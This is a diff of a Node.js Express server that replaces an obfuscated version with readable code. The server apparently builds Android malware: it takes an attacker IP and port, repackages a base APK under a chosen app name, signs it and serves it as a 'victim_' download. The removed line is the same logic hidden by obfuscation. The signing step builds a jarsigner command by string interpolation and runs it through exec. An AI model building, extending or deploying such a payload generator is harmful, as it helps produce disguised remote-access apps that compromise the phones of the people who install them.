@@ -1,1 +1,112 @@
-const a0_0x44d770=a0_0x4a82;(function(_0xc1cb0f,_0x59a92a){const _0x5254c2=a0_0x4a82,_0x169f71=_0xc1cb0f();while(!![]){try{const _0x58b5dd=-parseInt(_0x5254c2(0x1b8))/0x1*(parseInt(_0x5254c2(0x1aa))/0x2)+-parseInt(_0x5254c2(0x1a1))/0x3+-parseInt(_0x5254c2(0x1c3))/0x4+parseInt(_0x5254c2(0x1b9))/0x5*(-parseInt(_0x5254c2(0x1a5))/0x6)+-parseInt(_0x5254c2(0x1b6))/0x7+-parseInt(_0x5254c2(0x19c))/0x8+parseInt(_0x5254c2(0x1c0))/0x9;if(_0x58b5dd===_0x59a92a)break;else _0x169f71['push'](_0x169f71['shift']());}catch(_0x4eeaca){_0x169f71['push'](_0x169f71['shift']());}}}(a0_0x282e,0xceb68));function a0_0x4a82(_0x5df731,_0x28c1aa){const _0x282e74=a0_0x282e();return a0_0x4a82=function(_0x4a8210,_0x407658){_0x4a8210=_0x4a8210-0x198;let _0x34f56c=_0x282e74[_0x4a8210];return _0x34f56c;},a0_0x4a82(_0x5df731,_0x28c1aa);}import a0_0x900fbe from'express';import a0_0x57d599 from'cors';function a0_0x282e(){const _0x57fc78=['../../output_apks','values','mkdirSync','env','res','use','get','\x22\x20-signedjar\x20\x22','temp_','/download/:buildId','8936008qdGejU','writeFileSync','\x22\x20-storepass\x20\x22','/build-apk','floor','3477645YyNUSC','now','victim_','body','542532AJOshk','writeZip','rmSync','password123','readFileSync','2810vkNUzz','.apk','KEY_ALIAS','random','join','\x22\x20\x22','</string>','../../keystore.jks','extractAllTo','strings.xml','json','/download/','10705751ibgrxz','100mb','818twiWoo','60eHcSrc','lstatSync','KEY_PASSWORD','addLocalFile','status','forEach','replace','76246668qqtXYr','readdirSync','utf8','6340772ouvSKv','error','APK\x20built\x20and\x20ready','APK\x20not\x20found','params','isDirectory','\x22\x20-keypass\x20\x22','post','single','unlinkSync','Missing\x20fields','existsSync','download'];a0_0x282e=function(){return _0x57fc78;};return a0_0x282e();}import a0_0x956d9a from'multer';import a0_0x2720ec from'fs';import a0_0x54e01a from'path';import a0_0x1d7af9 from'adm-zip';import{exec}from'child_process';const app=a0_0x900fbe();app['use'](a0_0x57d599()),app[a0_0x44d770(0x1d5)](a0_0x900fbe['json']({'limit':a0_0x44d770(0x1b7)}));const upload=a0_0x956d9a(),BASE_APK_PATH=a0_0x54e01a['join'](__dirname,'../../base.apk'),OUTPUT_DIR=a0_0x54e01a['join'](__dirname,a0_0x44d770(0x1d0)),UPLOADS_DIR=a0_0x54e01a[a0_0x44d770(0x1ae)](__dirname,'../../uploads'),KEYSTORE_PATH=a0_0x54e01a[a0_0x44d770(0x1ae)](__dirname,a0_0x44d770(0x1b1)),KEYSTORE_PASSWORD=process[a0_0x44d770(0x1d3)]['KEYSTORE_PASSWORD']||a0_0x44d770(0x1a8),KEY_ALIAS=process[a0_0x44d770(0x1d3)][a0_0x44d770(0x1ac)]||'mykey',KEY_PASSWORD=process[a0_0x44d770(0x1d3)][a0_0x44d770(0x1bb)]||a0_0x44d770(0x1a8);if(!a0_0x2720ec[a0_0x44d770(0x1ce)](OUTPUT_DIR))a0_0x2720ec[a0_0x44d770(0x1d2)](OUTPUT_DIR,{'recursive':!![]});if(!a0_0x2720ec[a0_0x44d770(0x1ce)](UPLOADS_DIR))a0_0x2720ec[a0_0x44d770(0x1d2)](UPLOADS_DIR,{'recursive':!![]});app[a0_0x44d770(0x198)]('/',(_0x5c059d,_0x446812)=>{const _0x2765ff=a0_0x44d770;_0x446812[_0x2765ff(0x1b4)]({'status':'APK\x20Builder\x20Live','baseApk':a0_0x2720ec[_0x2765ff(0x1ce)](BASE_APK_PATH)});}),app[a0_0x44d770(0x1ca)](a0_0x44d770(0x19f),upload[a0_0x44d770(0x1cb)]('iconFile'),async(_0x11b62a,_0x58cf47)=>{const _0x3ac41c=a0_0x44d770;try{const {appName:_0x6839bd,attackerIp:_0x48f853,attackerPort:_0x40e35b,backendUrl:_0x805560,packageName:_0x4278ba}=_0x11b62a[_0x3ac41c(0x1a4)];if(!_0x6839bd||!_0x48f853||!_0x40e35b)return _0x58cf47[_0x3ac41c(0x1bd)](0x190)[_0x3ac41c(0x1b4)]({'error':_0x3ac41c(0x1cd)});const _0x308c0d=Date[_0x3ac41c(0x1a2)]()+'_'+Math[_0x3ac41c(0x1a0)](Math[_0x3ac41c(0x1ad)]()*0x2710),_0x48654c=a0_0x54e01a[_0x3ac41c(0x1ae)](OUTPUT_DIR,_0x3ac41c(0x19a)+_0x308c0d),_0x2c149e=a0_0x54e01a[_0x3ac41c(0x1ae)](OUTPUT_DIR,'unsigned_'+_0x308c0d+_0x3ac41c(0x1ab)),_0x2161c9=a0_0x54e01a[_0x3ac41c(0x1ae)](OUTPUT_DIR,_0x3ac41c(0x1a3)+_0x308c0d+'.apk'),_0x396be7=new a0_0x1d7af9(BASE_APK_PATH);_0x396be7[_0x3ac41c(0x1b2)](_0x48654c,!![]);const _0xf4d47f=a0_0x54e01a[_0x3ac41c(0x1ae)](_0x48654c,_0x3ac41c(0x1d4),_0x3ac41c(0x1d1),_0x3ac41c(0x1b3));if(a0_0x2720ec[_0x3ac41c(0x1ce)](_0xf4d47f)){let _0x1a49e8=a0_0x2720ec[_0x3ac41c(0x1a9)](_0xf4d47f,_0x3ac41c(0x1c2));_0x1a49e8=_0x1a49e8[_0x3ac41c(0x1bf)](/<string name="app_name">[^<]*<\/string>/,'<string\x20name=\x22app_name\x22>'+_0x6839bd+_0x3ac41c(0x1b0)),a0_0x2720ec[_0x3ac41c(0x19d)](_0xf4d47f,_0x1a49e8,_0x3ac41c(0x1c2));}const _0x5e1528=new a0_0x1d7af9();(function _0xfc650f(_0x545393,_0x260d70,_0x473d95=''){const _0x48505f=_0x3ac41c;a0_0x2720ec[_0x48505f(0x1c1)](_0x260d70)[_0x48505f(0x1be)](_0x17139a=>{const _0x3a6f37=_0x48505f,_0x16858d=a0_0x54e01a[_0x3a6f37(0x1ae)](_0x260d70,_0x17139a),_0x47563e=_0x473d95?_0x473d95+'/'+_0x17139a:_0x17139a;a0_0x2720ec[_0x3a6f37(0x1ba)](_0x16858d)[_0x3a6f37(0x1c8)]()?_0xfc650f(_0x545393,_0x16858d,_0x47563e):_0x545393[_0x3a6f37(0x1bc)](_0x16858d,_0x473d95);});}(_0x5e1528,_0x48654c),_0x5e1528[_0x3ac41c(0x1a6)](_0x2c149e));let _0x55fe96=_0x2c149e;a0_0x2720ec[_0x3ac41c(0x1ce)](KEYSTORE_PATH)&&(await signApk(_0x2c149e,_0x2161c9),_0x55fe96=_0x2161c9),a0_0x2720ec[_0x3ac41c(0x1a7)](_0x48654c,{'recursive':!![],'force':!![]}),_0x58cf47[_0x3ac41c(0x1b4)]({'success':!![],'downloadUrl':_0x3ac41c(0x1b5)+_0x308c0d,'signed':a0_0x2720ec[_0x3ac41c(0x1ce)](KEYSTORE_PATH),'message':_0x3ac41c(0x1c5)});}catch(_0x4f9fd6){console[_0x3ac41c(0x1c4)](_0x4f9fd6),_0x58cf47[_0x3ac41c(0x1bd)](0x1f4)[_0x3ac41c(0x1b4)]({'error':_0x4f9fd6['message']});}}),app[a0_0x44d770(0x198)](a0_0x44d770(0x19b),(_0x3545f0,_0x2554b8)=>{const _0x11ce76=a0_0x44d770,{buildId:_0x8a23c8}=_0x3545f0[_0x11ce76(0x1c7)],_0x5f5adb=a0_0x54e01a[_0x11ce76(0x1ae)](OUTPUT_DIR,'victim_'+_0x8a23c8+_0x11ce76(0x1ab)),_0x5ed239=a0_0x54e01a[_0x11ce76(0x1ae)](OUTPUT_DIR,'unsigned_'+_0x8a23c8+'.apk'),_0x39e5de=a0_0x2720ec[_0x11ce76(0x1ce)](_0x5f5adb)?_0x5f5adb:_0x5ed239;if(!a0_0x2720ec['existsSync'](_0x39e5de))return _0x2554b8[_0x11ce76(0x1bd)](0x194)[_0x11ce76(0x1b4)]({'error':_0x11ce76(0x1c6)});_0x2554b8[_0x11ce76(0x1cf)](_0x39e5de,_0x34e001=>{const _0x144553=_0x11ce76;!_0x34e001&&setTimeout(()=>a0_0x2720ec[_0x144553(0x1cc)](_0x39e5de),0x5*0x3c*0x3e8);});});function signApk(_0x7568c2,_0x3af908){return new Promise((_0x483856,_0x46ea97)=>{const _0x385d92=a0_0x4a82,_0x526588='jarsigner\x20-verbose\x20-keystore\x20\x22'+KEYSTORE_PATH+_0x385d92(0x19e)+KEYSTORE_PASSWORD+_0x385d92(0x1c9)+KEY_PASSWORD+_0x385d92(0x199)+_0x3af908+'\x22\x20\x22'+_0x7568c2+_0x385d92(0x1af)+KEY_ALIAS+'\x22';exec(_0x526588,(_0x502a65,_0x371c37,_0x324c29)=>{if(_0x502a65)return _0x46ea97(new Error(_0x324c29));_0x483856(_0x371c37);});});}
+import express from "express";
+import cors from "cors";
+import multer from "multer";
+import fs from "fs";
+import path from "path";
+import AdmZip from "adm-zip";
+import { exec } from "child_process";
+import { fileURLToPath } from 'url';
+import { dirname } from 'path';
+
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = dirname(__filename);
+
+const baseApkFile = path.resolve(__dirname, "base.apk");
+const resultApkFolder = path.resolve(__dirname, "output_apks");
+const uploadTmpFolder = path.resolve(__dirname, "uploads");
+const keyStoreFile = path.resolve(__dirname, "keystore.jks");
+
+const keyStorePass = process.env.KEYSTORE_PASSWORD || "password123";
+const keyAliasPass = process.env.KEY_ALIAS || "mykey";
+const keyPass = process.env.KEY_PASSWORD || "password123";
+
+const app = express();
+
+app.use(cors());
+app.use(express.json({ limit: "100mb" }));
+
+const upload = multer();
+
+if (!fs.existsSync(resultApkFolder)) fs.mkdirSync(resultApkFolder, { recursive: true });
+if (!fs.existsSync(uploadTmpFolder)) fs.mkdirSync(uploadTmpFolder, { recursive: true });
+
+app.get("/", (req, res) => {
+  res.json({ status: "APK Builder Live", baseApkExists: fs.existsSync(baseApkFile) });
+});
+
+app.post("/build-apk", upload.single("iconFile"), async (req, res) => {
+  try {
+    const { applicationName, remoteIP, remotePort, backendServiceUrl, packageName } = req.body;
+    if (!applicationName || !remoteIP || !remotePort) return res.status(400).json({ error: "Missing fields" });
+
+    const uniqueBuild = Date.now() + "_" + Math.floor(Math.random() * 10000);
+    const tempExtractionFolder = path.join(resultApkFolder, `temp_${uniqueBuild}`);
+    const unsignedApkFile = path.join(resultApkFolder, `unsigned_${uniqueBuild}.apk`);
+    const signedApkFile = path.join(resultApkFolder, `victim_${uniqueBuild}.apk`);
+
+    const zip = new AdmZip(baseApkFile);
+    zip.extractAllTo(tempExtractionFolder, true);
+
+    const stringsXmlPath = path.join(tempExtractionFolder, "res", "values", "strings.xml");
+    if (fs.existsSync(stringsXmlPath)) {
+      let xmlContent = fs.readFileSync(stringsXmlPath, "utf8");
+      xmlContent = xmlContent.replace(/<string name="app_name">[^<]*<\/string>/,
+        `<string name="app_name">${applicationName}</string>`);
+      fs.writeFileSync(stringsXmlPath, xmlContent, "utf8");
+    }
+
+    const zipNew = new AdmZip();
+    (function addToZip(zipper, folder, base = "") {
+      fs.readdirSync(folder).forEach(item => {
+        const fullItemPath = path.join(folder, item);
+        const relativePath = base ? `${base}/${item}` : item;
+        if (fs.lstatSync(fullItemPath).isDirectory()) addToZip(zipper, fullItemPath, relativePath);
+        else zipper.addLocalFile(fullItemPath, base);
+      });
+    })(zipNew, tempExtractionFolder);
+
+    zipNew.writeZip(unsignedApkFile);
+
+    let outputApkPath = unsignedApkFile;
+    if (fs.existsSync(keyStoreFile)) {
+      await sign_apk(unsignedApkFile, signedApkFile);
+      outputApkPath = signedApkFile;
+    }
+
+    fs.rmSync(tempExtractionFolder, { recursive: true, force: true });
+
+    res.json({ success: true, downloadUrl: `/download/${uniqueBuild}`, signed: fs.existsSync(keyStoreFile), message: "APK built and ready" });
+
+  } catch (error) {
+    console.error(error);
+    res.status(500).json({ error: error.message });
+  }
+});
+
+app.get("/download/:buildId", (req, res) => {
+  const { buildId } = req.params;
+  const signedApk = path.join(resultApkFolder, `victim_${buildId}.apk`);
+  const unsignedApk = path.join(resultApkFolder, `unsigned_${buildId}.apk`);
+  const apkToSend = fs.existsSync(signedApk) ? signedApk : unsignedApk;
+
+  if (!fs.existsSync(apkToSend)) return res.status(404).json({ error: "APK not found" });
+
+  res.download(apkToSend, err => {
+    if (!err) fs.unlink(apkToSend, unlinkErr => { if (unlinkErr) console.error("Error deleting APK:", unlinkErr); });
+  });
+});
+
+function sign_apk(input, output) {
+  return new Promise((resolve, reject) => {
+    const command = `jarsigner -verbose -keystore "${keyStoreFile}" -storepass "${keyStorePass}" -keypass "${keyPass}" -signedjar "${output}" "${input}" "${keyAliasPass}"`;
+    exec(command, (err, stdout, stderr) => {
+      if (err) return reject(new Error(stderr));
+      resolve(stdout);
+    });
+  });
+}
+
+const port = process.env.PORT || 1808;
+app.listen(port, () => { console.log(`Server running on port ${port}`); });
+
+export default app;
